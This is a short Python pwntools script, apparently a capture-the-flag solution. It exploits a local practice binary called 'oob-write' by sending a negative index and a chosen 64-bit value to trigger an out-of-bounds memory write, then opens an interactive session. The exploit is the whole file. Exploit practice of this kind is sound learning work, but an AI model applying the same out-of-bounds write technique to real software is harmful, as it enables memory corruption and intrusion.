#!/usr/bin/env python3

'''
    idx = -9
    val = 18077091283008876557
'''

from pwn import *

TARGET = './oob-write'

p = process(TARGET)

idx = str(-9).encode()
# val = str(18077091283008876557).encode()
val = str(int(0xfadebabed00df00d)).encode()

p.sendlineafter(b'index > ', idx)
p.sendlineafter(b'fingerprint ID > ', val)

p.interactive()
